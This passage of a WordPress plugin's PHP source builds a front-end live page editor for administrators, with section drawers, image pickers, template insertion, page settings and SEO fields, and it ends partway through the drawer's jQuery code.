      box-sizing: border-box;
      flex-shrink: 0;
    }
    .rs-drawer-logo {
      background: #DE1515;
      color: #fff;
      font-weight: 800;
      width: 32px;
      height: 32px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      flex-shrink: 0;
    }
    .rs-drawer-title-area {
      flex-grow: 1;
      margin-left: 12px;
    }
    .rs-drawer-title-area h3 {
      font-size: 14px;
      margin: 0;
      color: #1e293b;
      font-weight: 700;
    }
    .rs-drawer-title-area p {
      font-size: 10px;
      margin: 2px 0 0 0;
      color: #64748b;
    }
    .rs-drawer-close {
      background: transparent;
      border: none;
      color: #64748b;
      font-size: 24px;
      cursor: pointer;
      line-height: 1;
      outline: none;
    }
    .rs-drawer-close:hover {
      color: #1e293b;
    }
    .rs-drawer-scrollable {
      flex-grow: 1;
      overflow-y: auto;
      padding: 20px;
      padding-bottom: 90px;
      box-sizing: border-box;
    }
    .rs-drawer-footer {
      position: absolute;
      bottom: 0;
      left: 0;
      width: 100%;
      background: #ffffff;
      padding: 15px 20px;
      box-sizing: border-box;
      border-top: 1px solid #e2e8f0;
      display: flex;
      gap: 8px;
    }

    /* ── Shift Body and Header when Drawer Active ── */
    body.rs-drawer-active {
      padding-left: 420px !important;
      transition: padding-left 0.3s ease;
    }
    body.rs-drawer-active #header {
      left: 420px !important;
      transition: left 0.3s ease;
    }
    body.rs-drawer-active #scroll-top,
    body.rs-drawer-active .floating-whatsapp {
      transform: translateX(420px);
    }

    /* ── Right Panel & Right Drawer Styles ── */
    .rs-right-panel {
      width: 320px !important;
      min-width: 320px !important;
      max-width: 320px !important;
      height: 100% !important;
      max-height: 100% !important;
      overflow-y: auto !important;
      background: #ffffff !important;
      border-left: 1px solid #e2e8f0 !important;
      padding: 20px 20px 80px 20px !important;
      box-sizing: border-box !important;
    }
    .rs-frontend-right-drawer {
      left: auto !important;
      right: -325px !important;
      border-left: 1px solid #e2e8f0 !important;
      border-right: none !important;
      transition: right 0.3s ease !important;
    }
    .rs-frontend-right-drawer.rs-drawer-open {
      right: 0 !important;
    }
    body.rs-right-drawer-active {
      padding-right: 320px !important;
      transition: padding-right 0.3s ease;
    }
    body.rs-right-drawer-active #header {
      right: 320px !important;
      transition: right 0.3s ease;
    }
    body.rs-right-drawer-active #scroll-top,
    body.rs-right-drawer-active .floating-whatsapp {
      transform: translateX(-320px) !important;
    }
    body.rs-drawer-active.rs-right-drawer-active #scroll-top,
    body.rs-drawer-active.rs-right-drawer-active .floating-whatsapp {
      transform: translateX(100px) !important; /* Offset combination */
    }

    /* Featured Image styling */
    .rs-featured-image-wrapper {
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 6px;
      padding: 15px;
      text-align: center;
    }
    .rs-featured-image-preview {
      width: 100%;
      min-height: 120px;
      background: #f1f5f9;
      border: 1px dashed #cbd5e1;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 12px;
      overflow: hidden;
    }
    .rs-featured-image-preview img {
      max-width: 100%;
      max-height: 150px;
      object-fit: contain;
    }
    .rs-featured-image-placeholder {
      color: #94a3b8;
      font-size: 12px;
      font-family: sans-serif;
    }
    .rs-featured-image-actions {
      display: flex;
      gap: 8px;
      justify-content: center;
    }
  </style>
  <?php
}

// Enqueue media library assets on frontend for logged-in admins
function redspider_editor_frontend_assets()
{
  if (is_user_logged_in() && current_user_can('manage_options') && is_singular('page')) {
    wp_enqueue_media();
  }
}
add_action('wp_enqueue_scripts', 'redspider_editor_frontend_assets');

// Print styles on frontend for logged-in admins
function redspider_editor_frontend_styles()
{
  if (is_user_logged_in() && current_user_can('manage_options') && is_singular('page')) {
    redspider_editor_print_styles();
  }
}
add_action('wp_head', 'redspider_editor_frontend_styles');

// Handle Frontend Page visual updates saving
function redspider_editor_frontend_save_handler()
{
  if (isset($_POST['redspider_save_editor']) && check_admin_referer('redspider_editor_save_action', 'redspider_editor_nonce')) {
    if (!current_user_can('manage_options')) {
      wp_die(__('Permission denied.', 'redspider-editor'));
    }
    $page_to_update = intval($_POST['edit_page_id']);
    if (redspider_editor_save_page_data($page_to_update, $_POST)) {
      $redirect_url = add_query_arg('rs_save_success', '1', get_permalink($page_to_update));
      wp_safe_redirect($redirect_url);
      exit;
    }
  }
}
add_action('template_redirect', 'redspider_editor_frontend_save_handler');

// Render On-Page Slide Drawer Editor on all pages for admins
function redspider_editor_frontend_drawer()
{
  if (!is_user_logged_in() || !current_user_can('manage_options') || !is_singular('page')) {
    return;
  }

  $page_id = get_the_ID();
  $post = get_post($page_id);
  $content = $post->post_content;

  // Clean indices
  $content = preg_replace('/<!--\s*(text|link|img|bg-img)-index:\s*\d+\s*-->/i', '', $content);

  $text_counter = 0;
  $link_counter = 0;
  $img_counter = 0;
  $bg_img_counter = 0;

  // Inject markers for headings, paragraphs, spans, links
  $content = preg_replace_callback(
    '/(<(h[1-6]|p|span|a)\b[^>]*>)(.*?)(<\/\2>)/is',
    function ($matches) use (&$text_counter) {
      $tag_start = $matches[1];
      $inner = $matches[3];
      $tag_end = $matches[4];
      if (trim(strip_tags($inner)) === '') {
        return $matches[0];
      }
      $res = '<!-- text-index: ' . $text_counter . ' -->' . $tag_start . $inner . $tag_end;
      $text_counter++;
      return $res;
    },
    $content
  );

  // Inject markers for links
  $content = preg_replace_callback(
    '/(<a[^>]+href=["\'])(.*?)(["\'][^>]*>)/is',
    function ($matches) use (&$link_counter) {
      $start = $matches[1];
      $url = $matches[2];
      $end = $matches[3];
      $res = '<!-- link-index: ' . $link_counter . ' -->' . $start . $url . $end;
      $link_counter++;
      return $res;
    },
    $content
  );

  // Inject markers for images
  $content = preg_replace_callback(
    '/(<img[^>]+src=["\'])(.*?)(["\'][^>]*>)/is',
    function ($matches) use (&$img_counter) {
      $start = $matches[1];
      $src = $matches[2];
      $end = $matches[3];
      $res = '<!-- img-index: ' . $img_counter . ' -->' . $start . $src . $end;
      $img_counter++;
      return $res;
    },
    $content
  );

  // Inject markers for background images
  $content = preg_replace_callback(
    '/(<[a-zA-Z0-9]+[^>]+style=["\'][^"\']*(?:background-image|background)\s*:\s*url\(\s*["\']?)(.*?)(["\']?\s*\)[^"\']*["\'])/is',
    function ($matches) use (&$bg_img_counter) {
      $start = $matches[1];
      $url = $matches[2];
      $end = $matches[3];
      $res = '<!-- bg-img-index: ' . $bg_img_counter . ' -->' . $start . $url . $end;
      $bg_img_counter++;
      return $res;
    },
    $content
  );

  // Save cleanly injected content back to the database so frontend and editor match
  wp_update_post([
    'ID'           => $page_id,
    'post_content' => $content,
  ]);

  // Gather all indexed elements
  preg_match_all('/<!--\s*text-index:\s*(\d+)\s*-->\s*<(h[1-6]|p|span|a)\b[^>]*>(.*?)(<\/\2>)/is', $content, $text_matches, PREG_SET_ORDER);
  preg_match_all('/<!--\s*link-index:\s*(\d+)\s*-->\s*<a[^>]+href=["\'](.*?)["\']/is', $content, $link_matches, PREG_SET_ORDER);
  preg_match_all('/<!--\s*img-index:\s*(\d+)\s*-->\s*<img[^>]+src=["\'](.*?)["\']/is', $content, $img_matches, PREG_SET_ORDER);
  preg_match_all('/<!--\s*bg-img-index:\s*(\d+)\s*-->\s*<[a-zA-Z0-9]+[^>]+style=["\'][^"\']*(?:background-image|background)\s*:\s*url\(\s*["\']?(.*?)["\']?\s*\)/is', $content, $bg_img_matches, PREG_SET_ORDER);

  // Find all sections
  preg_match_all('/<section([^>]*)>(.*?)<\/section>/is', $content, $sections, PREG_SET_ORDER);

  $grouped_elements = [];
  $assigned_texts = [];
  $assigned_links = [];
  $assigned_images = [];
  $assigned_bg_images = [];

  foreach ($sections as $s_idx => $s_data) {
    $s_attrs = $s_data[1];
    $s_html = $s_data[0];
    
    $s_id = '';
    if (preg_match('/id=["\']([^"\']+)["\']/i', $s_attrs, $im)) {
      $s_id = $im[1];
    }
    
    $s_label = '';
    if (preg_match('/<(h[1-3])\b[^>]*>(.*?)<\/\1>/is', $s_html, $hm)) {
      $s_label = trim(strip_tags($hm[2]));
    }
    
    $s_title = "Section " . ($s_idx + 1);
    if ($s_id) {
      $s_title .= " (ID: $s_id)";
    }
    if ($s_label) {
      $s_title .= " - \"" . (strlen($s_label) > 40 ? substr($s_label, 0, 37) . '...' : $s_label) . "\"";
    }

    $s_texts = [];
    foreach ($text_matches as $tm) {
      if (strpos($s_html, '<!-- text-index: ' . $tm[1] . ' -->') !== false) {
        $s_texts[] = $tm;
        $assigned_texts[$tm[1]] = true;
      }
    }
    
    $s_links = [];
    foreach ($link_matches as $lm) {
      if (strpos($s_html, '<!-- link-index: ' . $lm[1] . ' -->') !== false) {
        $s_links[] = $lm;
        $assigned_links[$lm[1]] = true;
      }
    }

    $s_imgs = [];
    foreach ($img_matches as $im) {
      if (strpos($s_html, '<!-- img-index: ' . $im[1] . ' -->') !== false) {
        $s_imgs[] = $im;
        $assigned_images[$im[1]] = true;
      }
    }

    $s_bg_imgs = [];
    foreach ($bg_img_matches as $bim) {
      if (strpos($s_html, '<!-- bg-img-index: ' . $bim[1] . ' -->') !== false) {
        $s_bg_imgs[] = $bim;
        $assigned_bg_images[$bim[1]] = true;
      }
    }

    $grouped_elements[] = [
      'title' => $s_title,
      'html' => $s_html,
      'texts' => $s_texts,
      'links' => $s_links,
      'images' => $s_imgs,
      'bg_images' => $s_bg_imgs,
    ];
  }

  $general_texts = [];
  foreach ($text_matches as $tm) {
    if (!isset($assigned_texts[$tm[1]])) {
      $general_texts[] = $tm;
    }
  }

  $grouped_elements = array_filter($grouped_elements, function($group) {
    return !empty($group['html']);
  });

  $templates = redspider_get_builder_templates();
  $templates_json = [];
  foreach ($templates as $slug => $label) {
    $file = plugin_dir_path(__FILE__) . 'templates/' . $slug . '.html';
    if (file_exists($file)) {
      $templates_json[$slug] = file_get_contents($file);
    }
  }

  $custom_templates = get_option('redspider_custom_templates', []);
  foreach ($custom_templates as $slug => $data) {
    $templates_json['custom_' . $slug] = $data['html'];
  }
  // Fetch document metadata variables for frontend
  $thumbnail_id = get_post_thumbnail_id($page_id);
  $thumbnail_url = $thumbnail_id ? wp_get_attachment_url($thumbnail_id) : '';
  $page_templates = wp_get_theme()->get_page_templates();
  $current_template = get_post_meta($page_id, '_wp_page_template', true);
  $all_pages = get_pages();

  // SEO keys
  $seo_focuskw = get_post_meta($page_id, '_yoast_wpseo_focuskw', true);
  if (empty($seo_focuskw)) {
    $seo_focuskw = get_post_meta($page_id, '_rank_math_focus_keyword', true);
  }
  $seo_title_val = get_post_meta($page_id, '_yoast_wpseo_title', true);
  if (empty($seo_title_val)) {
    $seo_title_val = get_post_meta($page_id, '_rank_math_title', true);
  }
  $seo_metadesc_val = get_post_meta($page_id, '_yoast_wpseo_metadesc', true);
  if (empty($seo_metadesc_val)) {
    $seo_metadesc_val = get_post_meta($page_id, '_rank_math_description', true);
  }
  ?>

  <!-- Trigger FAB Button -->
  <div class="rs-frontend-edit-fab" id="rs-frontend-edit-toggle" title="Edit Page with RedSpider">
    <div class="rs-fab-icon">RS</div>
    <span class="rs-fab-text">Edit Page</span>
  </div>

  <form method="post" action="" class="rs-editor-form" id="rs-frontend-editor-form" style="display: contents;">
    <?php wp_nonce_field('redspider_editor_save_action', 'redspider_editor_nonce'); ?>
    <input type="hidden" name="edit_page_id" value="<?php echo esc_attr($page_id); ?>">

    <!-- Slide-out Drawer Panel -->
    <div class="rs-frontend-drawer" id="rs-frontend-drawer">
      <div class="rs-drawer-header">
        <div class="rs-drawer-logo">RS</div>
        <div class="rs-drawer-title-area">
          <h3>RedSpider Live Editor</h3>
          <p>Edit layout elements directly on this page</p>
        </div>
        <button type="button" class="rs-drawer-settings" id="rs-frontend-settings-toggle" title="Page Settings & SEO" style="background:transparent; border:none; color:#aaa; font-size:18px; cursor:pointer; margin-right:10px; outline:none;">⚙</button>
        <button type="button" class="rs-drawer-close" id="rs-frontend-drawer-close">&times;</button>
      </div>

      <?php if (isset($_GET['rs_save_success'])) : ?>
        <div class="rs-alert rs-alert-success" style="position: relative; top: 0; width: 100%;">
          <span class="rs-alert-icon">✓</span> Changes saved successfully!
        </div>
      <?php endif; ?>

      <div class="rs-drawer-scrollable">
        <!-- Page Settings Box -->
        <div class="rs-page-settings-box">
          <h4>Page Settings</h4>
          <div class="rs-fields-grid" style="grid-template-columns: 1fr 1fr;">
            <div class="rs-field-item">
              <label>Page Title</label>
              <input type="text" name="page_title" value="<?php echo esc_attr($post->post_title); ?>" required>
            </div>
            <div class="rs-field-item">
              <label>Page Status</label>
              <select name="page_status" class="rs-styled-select">
                <option value="publish" <?php selected($post->post_status, 'publish'); ?>>Publish</option>
                <option value="draft" <?php selected($post->post_status, 'draft'); ?>>Draft</option>
                <option value="pending" <?php selected($post->post_status, 'pending'); ?>>Pending Review</option>
              </select>
            </div>
            <div class="rs-field-item" style="grid-column: span 2;">
              <a href="<?php echo esc_url(get_edit_post_link($page_id)); ?>" target="_blank" class="rs-btn rs-btn-secondary" style="width: 100%; display: flex; justify-content: center; font-size: 11px; text-transform: uppercase;">
                Edit Advanced / SEO Settings ↗
              </a>
            </div>
          </div>
        </div>

        <!-- Collapsible Accordion sections -->
        <div class="rs-sections-accordion">
          <?php foreach ($grouped_elements as $index => $group) : ?>
            <div class="rs-accordion-item" draggable="true">
              <button type="button" class="rs-accordion-header" data-target="rs-drawer-body-<?php echo esc_attr($index); ?>">
                <div class="rs-drag-handle" title="Drag to Reorder">⋮⋮</div>
                <span class="rs-accordion-title"><?php echo esc_html($group['title']); ?></span>
                <div class="rs-accordion-controls">
                  <span class="rs-control-btn rs-move-up" title="Move Up">↑</span>
                  <span class="rs-control-btn rs-move-down" title="Move Down">↓</span>
                  <span class="rs-control-btn rs-duplicate" title="Duplicate Section">❐</span>
                  <span class="rs-control-btn rs-save-template" title="Save Section as Template">💾</span>
                  <span class="rs-control-btn rs-delete" title="Delete Section">🗑</span>
                </div>
                <span class="rs-accordion-icon">▼</span>
              </button>
              <div id="rs-drawer-body-<?php echo esc_attr($index); ?>" class="rs-accordion-body">
                <div class="rs-accordion-content">
                  
                  <textarea name="section_htmls[]" class="rs-section-html" style="display:none;"><?php echo esc_textarea($group['html']); ?></textarea>

                  <!-- TEXT FIELDS -->
                  <?php if (!empty($group['texts'])) : ?>
                    <div class="rs-group-container">
                      <h4 class="rs-group-title">Texts & Headings</h4>
                      <div class="rs-fields-grid">
                        <?php foreach ($group['texts'] as $match) :
                          $idx = $match[1];
                          $tag = $match[2];
                          $text = trim(strip_tags($match[3]));
                          if (empty($text)) continue;
                          ?>
                          <div class="rs-field-item">
                            <label>Element: &lt;<?php echo esc_html($tag); ?>&gt; <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                            <?php if ($tag === 'p') : ?>
                              <textarea name="texts[<?php echo esc_attr($idx); ?>]"><?php echo esc_textarea($text); ?></textarea>
                            <?php else : ?>
                              <input type="text" name="texts[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($text); ?>">
                            <?php endif; ?>
                          </div>
                        <?php endforeach; ?>
                      </div>
                    </div>
                  <?php endif; ?>

                  <!-- LINKS FIELDS -->
                  <?php if (!empty($group['links'])) : ?>
                    <div class="rs-group-container">
                      <h4 class="rs-group-title">Action Button Links (URLs)</h4>
                      <div class="rs-fields-grid">
                        <?php foreach ($group['links'] as $match) :
                          $idx = $match[1];
                          $url = $match[2];
                          ?>
                          <div class="rs-field-item">
                            <label>Link URL <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                            <input type="text" name="links[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($url); ?>">
                          </div>
                        <?php endforeach; ?>
                      </div>
                    </div>
                  <?php endif; ?>

                  <!-- IMAGES FIELDS -->
                  <?php if (!empty($group['images'])) : ?>
                    <div class="rs-group-container">
                      <h4 class="rs-group-title">Layout Images</h4>
                      <div class="rs-images-grid">
                        <?php foreach ($group['images'] as $match) :
                          $idx = $match[1];
                          $src = $match[2];
                          $display_src = str_replace('{{theme_uri}}', get_template_directory_uri(), $src);
                          ?>
                          <div class="rs-image-card">
                            <div class="rs-image-preview">
                              <img id="drawer-img-preview-<?php echo esc_attr($idx); ?>" src="<?php echo esc_url($display_src); ?>">
                            </div>
                            <div class="rs-image-details">
                              <label>Image Source <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                              <input type="text" id="drawer-img-input-<?php echo esc_attr($idx); ?>" name="images[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($src); ?>">
                              <button type="button" class="rs-btn rs-btn-small redspider-upload-btn" data-index="<?php echo esc_attr($idx); ?>" data-type="images">
                                Choose Image
                              </button>
                            </div>
                          </div>
                        <?php endforeach; ?>
                      </div>
                    </div>
                  <?php endif; ?>

                  <!-- BACKGROUND IMAGES FIELDS -->
                  <?php if (!empty($group['bg_images'])) : ?>
                    <div class="rs-group-container">
                      <h4 class="rs-group-title">Section Background Images</h4>
                      <div class="rs-images-grid">
                        <?php foreach ($group['bg_images'] as $match) :
                          $idx = $match[1];
                          $src = $match[2];
                          $display_src = str_replace('{{theme_uri}}', get_template_directory_uri(), $src);
                          ?>
                          <div class="rs-image-card">
                            <div class="rs-image-preview">
                              <img id="drawer-bg-img-preview-<?php echo esc_attr($idx); ?>" src="<?php echo esc_url($display_src); ?>">
                            </div>
                            <div class="rs-image-details">
                              <label>Background URL <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                              <input type="text" id="drawer-bg-img-input-<?php echo esc_attr($idx); ?>" name="bg_images[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($src); ?>">
                              <button type="button" class="rs-btn rs-btn-small redspider-upload-btn" data-index="<?php echo esc_attr($idx); ?>" data-type="bg_images">
                                Choose Background
                              </button>
                            </div>
                          </div>
                        <?php endforeach; ?>
                      </div>
                    </div>
                  <?php endif; ?>

                  <!-- ENTRANCE ANIMATION -->
                  <?php
                  $current_anim = '';
                  if (preg_match('/data-aos=["\']([^"\']+)["\']/i', $group['html'], $am)) {
                    $current_anim = $am[1];
                  }
                  ?>
                  <div class="rs-group-container">
                    <h4 class="rs-group-title">Entrance Animation (AOS)</h4>
                    <div class="rs-fields-grid">
                      <div class="rs-field-item">
                        <label>Choose Animation style</label>
                        <select class="rs-section-animation-select" data-index="<?php echo esc_attr($index); ?>">
                          <option value="" <?php selected($current_anim, ''); ?>>None</option>
                          <option value="fade" <?php selected($current_anim, 'fade'); ?>>Fade In</option>
                          <option value="fade-up" <?php selected($current_anim, 'fade-up'); ?>>Fade Up</option>
                          <option value="fade-down" <?php selected($current_anim, 'fade-down'); ?>>Fade Down</option>
                          <option value="fade-left" <?php selected($current_anim, 'fade-left'); ?>>Fade Left</option>
                          <option value="fade-right" <?php selected($current_anim, 'fade-right'); ?>>Fade Right</option>
                          <option value="zoom-in" <?php selected($current_anim, 'zoom-in'); ?>>Zoom In</option>
                          <option value="zoom-out" <?php selected($current_anim, 'zoom-out'); ?>>Zoom Out</option>
                          <option value="flip-left" <?php selected($current_anim, 'flip-left'); ?>>Flip Left</option>
                          <option value="flip-right" <?php selected($current_anim, 'flip-right'); ?>>Flip Right</option>
                        </select>
                      </div>
                    </div>
                  </div>

                </div>
              </div>
            </div>
          <?php endforeach; ?>
        </div>

        <!-- Section adder area -->
        <div class="rs-add-section-area">
          <h4>Add Section Layout</h4>
          <p>Select a layout template to insert into the page layout.</p>
          <div class="rs-add-section-controls">
            <select id="rs-drawer-template-select">
              <option value="">-- Choose Layout --</option>
              <optgroup label="Default Layouts">
                <?php foreach ($templates as $slug => $label) : ?>
                  <option value="<?php echo esc_attr($slug); ?>"><?php echo esc_html($label); ?></option>
                <?php endforeach; ?>
              </optgroup>
              <?php if (!empty($custom_templates)) : ?>
                <optgroup id="rs-drawer-custom-templates-group" label="My Saved Templates">
                  <?php foreach ($custom_templates as $slug => $data) : ?>
                    <option value="custom_<?php echo esc_attr($slug); ?>"><?php echo esc_html($data['name']); ?></option>
                  <?php endforeach; ?>
                </optgroup>
              <?php else : ?>
                <optgroup id="rs-drawer-custom-templates-group" label="My Saved Templates" style="display:none;"></optgroup>
              <?php endif; ?>
            </select>
            <button type="button" id="rs-drawer-add-template-btn" class="rs-btn rs-btn-primary">
              + Add Layout
            </button>
          </div>
        </div>

        <!-- Submit Buttons -->
        <div class="rs-drawer-footer">
          <button type="submit" name="redspider_save_editor" class="rs-btn rs-btn-primary rs-btn-large" style="flex-grow: 1;">
            Save All Changes
          </button>
          <button type="button" id="rs-drawer-save-page-template-btn" class="rs-btn rs-btn-secondary" title="Save Entire Page as Template" style="height: auto; padding: 10px 15px;">
            💾
          </button>
        </div>
      </div>
    </div>

    <!-- Slide-out Settings Drawer Panel (Right) -->
    <div class="rs-frontend-drawer rs-frontend-right-drawer" id="rs-frontend-right-drawer" style="left: auto; right: -325px; width: 320px;">
      <div class="rs-drawer-header">
        <div class="rs-drawer-logo">⚙</div>
        <div class="rs-drawer-title-area">
          <h3>Document Settings</h3>
          <p>Featured Image, Attributes & SEO</p>
        </div>
        <button type="button" class="rs-drawer-close" id="rs-frontend-right-drawer-close">&times;</button>
      </div>

      <div class="rs-drawer-scrollable" style="padding-bottom: 30px;">
        <!-- Featured Image Box -->
        <div class="rs-page-settings-box">
          <h4>Featured Image</h4>
          <div class="rs-featured-image-wrapper">
            <input type="hidden" id="rs-drawer-featured-image-id" name="page_thumbnail_id" value="<?php echo esc_attr($thumbnail_id); ?>">
            <div class="rs-featured-image-preview" id="rs-drawer-featured-image-preview">
              <?php if ($thumbnail_url) : ?>
                <img src="<?php echo esc_url($thumbnail_url); ?>" style="max-width: 100%; max-height: 120px; display: block; margin: 0 auto 10px;">
              <?php else : ?>
                <span class="rs-featured-image-placeholder">No Image Set</span>
              <?php endif; ?>
            </div>
            <div class="rs-featured-image-actions" style="display: flex; gap: 8px; justify-content: center;">
              <button type="button" class="rs-btn rs-btn-small" id="rs-drawer-set-featured-image-btn">Set Image</button>
              <button type="button" class="rs-btn rs-btn-small rs-btn-secondary" id="rs-drawer-remove-featured-image-btn" style="<?php echo $thumbnail_url ? '' : 'display:none;'; ?>">Remove</button>
            </div>
          </div>
        </div>

        <!-- Page Attributes Box -->
        <div class="rs-page-settings-box">
          <h4>Page Attributes</h4>
          <div class="rs-fields-grid">
            <div class="rs-field-item">
              <label>Template</label>
              <select name="page_template" class="rs-styled-select">
                <option value="default">Default Template</option>
                <?php foreach ($page_templates as $temp_label => $temp_file) : ?>
                  <option value="<?php echo esc_attr($temp_file); ?>" <?php selected($current_template, $temp_file); ?>><?php echo esc_html($temp_label); ?></option>
                <?php endforeach; ?>
              </select>
            </div>
            <div class="rs-field-item">
              <label>Parent Page</label>
              <select name="page_parent" class="rs-styled-select">
                <option value="0">(no parent)</option>
                <?php foreach ($all_pages as $p) : 
                  if ($p->ID === $page_id) continue;
                  ?>
                  <option value="<?php echo esc_attr($p->ID); ?>" <?php selected($post->post_parent, $p->ID); ?>><?php echo esc_html($p->post_title); ?></option>
                <?php endforeach; ?>
              </select>
            </div>
            <div class="rs-field-item">
              <label>Order</label>
              <input type="number" name="menu_order" value="<?php echo esc_attr($post->menu_order); ?>" style="width: 100%; background: #fff; color: #1e293b; border: 1px solid #cbd5e1; border-radius: 6px; padding: 8px 12px; box-sizing: border-box; outline: none;">
            </div>
          </div>
        </div>

        <!-- Permalink Box -->
        <div class="rs-page-settings-box">
          <h4>Permalink / Slug</h4>
          <div class="rs-field-item">
            <label>URL Slug</label>
            <input type="text" name="page_slug" value="<?php echo esc_attr($post->post_name); ?>" required>
          </div>
        </div>

        <!-- SEO Settings Box -->
        <div class="rs-page-settings-box">
          <h4>SEO Settings</h4>
          <div class="rs-fields-grid">
            <div class="rs-field-item">
              <label>Focus Keyphrase</label>
              <input type="text" name="focus_keyword" value="<?php echo esc_attr($seo_focuskw); ?>">
            </div>
            <div class="rs-field-item">
              <label>SEO Title</label>
              <input type="text" name="seo_title" value="<?php echo esc_attr($seo_title_val); ?>">
            </div>
            <div class="rs-field-item">
              <label>Meta Description</label>
              <textarea name="seo_metadesc"><?php echo esc_textarea($seo_metadesc_val); ?></textarea>
            </div>
          </div>
        </div>
      </div>
    </div>
  </form>

  <script>
  var ajaxurl = '<?php echo esc_js(admin_url("admin-ajax.php")); ?>';
  var rsTemplates = <?php echo json_encode($templates_json); ?>;
  jQuery(document).ready(function($){
    // Toggle slide drawer (left)
    $('#rs-frontend-edit-toggle').click(function() {
      $('#rs-frontend-drawer').addClass('rs-drawer-open');
      $('body').addClass('rs-drawer-active');
      $(this).fadeOut(200);
    });

    $('#rs-frontend-drawer-close').click(function() {
      $('#rs-frontend-drawer').removeClass('rs-drawer-open');
      $('#rs-frontend-right-drawer').removeClass('rs-drawer-open');
      $('body').removeClass('rs-drawer-active rs-right-drawer-active');
      $('#rs-frontend-edit-toggle').fadeIn(200);
    });

    // Toggle right settings drawer
    $('#rs-frontend-settings-toggle').click(function(e) {
      e.preventDefault();
      var drawer = $('#rs-frontend-right-drawer');
      drawer.toggleClass('rs-drawer-open');
      $('body').toggleClass('rs-right-drawer-active');
      
      if (drawer.hasClass('rs-drawer-open')) {
        $(this).css('color', '#DE1515');
      } else {
        $(this).css('color', '#aaa');
      }
    });

    $('#rs-frontend-right-drawer-close').click(function(e) {
      e.preventDefault();
      $('#rs-frontend-right-drawer').removeClass('rs-drawer-open');
      $('body').removeClass('rs-right-drawer-active');
      $('#rs-frontend-settings-toggle').css('color', '#aaa');
    });

    // Drawer Featured Image uploaders
    $('#rs-drawer-set-featured-image-btn').click(function(e) {
      e.preventDefault();
      var custom_uploader = wp.media({
        title: 'Select Featured Image',
        button: { text: 'Set Featured Image' },
        multiple: false
      });
      custom_uploader.on('select', function() {
        var attachment = custom_uploader.state().get('selection').first().toJSON();
        $('#rs-drawer-featured-image-id').val(attachment.id);
        $('#rs-drawer-featured-image-preview').html('<img src="' + attachment.url + '" style="max-width: 100%; max-height: 120px; display: block; margin: 0 auto 10px;">');
        $('#rs-drawer-remove-featured-image-btn').show();
      });
      custom_uploader.open();
    });

    $('#rs-drawer-remove-featured-image-btn').click(function(e) {
      e.preventDefault();
      $('#rs-drawer-featured-image-id').val('0');
      $('#rs-drawer-featured-image-preview').html('<span class="rs-featured-image-placeholder">No Image Set</span>');
      $(this).hide();
    });

    // Automatically open drawer if rs_save_success or query is active
    var urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('rs_save_success')) {
      $('#rs-frontend-drawer').addClass('rs-drawer-open');
      $('body').addClass('rs-drawer-active');
      $('#rs-frontend-edit-toggle').hide();
    }

    // Drag & drop logic inside drawer
    var dragSrcEl = null;
    function handleDragStart(e) {
      $(this).addClass('rs-dragging');
      dragSrcEl = this;
      e.originalEvent.dataTransfer.effectAllowed = 'move';
      e.originalEvent.dataTransfer.setData('text/html', this.outerHTML);
    }
    function handleDragOver(e) {
      if (e.preventDefault) { e.preventDefault(); }
      e.originalEvent.dataTransfer.dropEffect = 'move';
      return false;
    }
    function handleDrop(e) {
      e.stopPropagation();
      if (dragSrcEl !== this) {
        var target = $(this);
        var dragEl = $(dragSrcEl);
        if (dragEl.index() < target.index()) {
          dragEl.insertAfter(target);
        } else {
          dragEl.insertBefore(target);
        }
        dragEl.addClass('rs-highlight-temp');
        setTimeout(function(){ dragEl.removeClass('rs-highlight-temp'); }, 600);
      }
      return false;
    }
    function handleDragEnd(e) {
      $('.rs-accordion-item').removeClass('rs-dragging');
    }

    $(document).on('dragstart', '.rs-frontend-drawer .rs-accordion-item', handleDragStart);
    $(document).on('dragover', '.rs-frontend-drawer .rs-accordion-item', handleDragOver);
    $(document).on('drop', '.rs-frontend-drawer .rs-accordion-item', handleDrop);
    $(document).on('dragend', '.rs-frontend-drawer .rs-accordion-item', handleDragEnd);

    // Accordion toggle
    $(document).on('click', '.rs-frontend-drawer .rs-accordion-header', function(e) {
      if ($(e.target).closest('.rs-accordion-controls, .rs-drag-handle').length) { return; }
      var target = $('#' + $(this).data('target'));
      var icon = $(this).find('.rs-accordion-icon');
      
      $('.rs-frontend-drawer .rs-accordion-body').not(target).slideUp(200).parent().removeClass('active');
      $('.rs-frontend-drawer .rs-accordion-icon').not(icon).text('▼');
      
      target.slideToggle(250, function() {
        if (target.is(':visible')) {
          icon.text('▲');
          target.parent().addClass('active');
        } else {
          icon.text('▼');
          target.parent().removeClass('active');
        }
      });
    });

    // Move Up
    $(document).on('click', '.rs-frontend-drawer .rs-move-up', function(e) {
      e.stopPropagation();
      var item = $(this).closest('.rs-accordion-item');
      var prev = item.prev('.rs-accordion-item');
      if (prev.length > 0) {
        item.insertBefore(prev).addClass('rs-highlight-temp');
        setTimeout(function(){ item.removeClass('rs-highlight-temp'); }, 600);
      }
    });

    // Move Down
    $(document).on('click', '.rs-frontend-drawer .rs-move-down', function(e) {
      e.stopPropagation();
      var item = $(this).closest('.rs-accordion-item');
      var next = item.next('.rs-accordion-item');
      if (next.length > 0) {
        item.insertAfter(next).addClass('rs-highlight-temp');
        setTimeout(function(){ item.removeClass('rs-highlight-temp'); }, 600);
      }
    });

    // Duplicate
    $(document).on('click', '.rs-frontend-drawer .rs-duplicate', function(e) {
      e.stopPropagation();
      var item = $(this).closest('.rs-accordion-item');
      var clone = item.clone(true);
      clone.removeClass('active').find('.rs-accordion-body').hide();
      clone.find('.rs-accordion-icon').text('▼');
      clone.insertAfter(item).addClass('rs-highlight-temp');
      setTimeout(function(){ clone.removeClass('rs-highlight-temp'); }, 600);
    });

    // Delete
    $(document).on('click', '.rs-frontend-drawer .rs-delete', function(e) {
      e.stopPropagation();
      if (confirm('Are you sure you want to delete this section?')) {
        var item = $(this).closest('.rs-accordion-item');
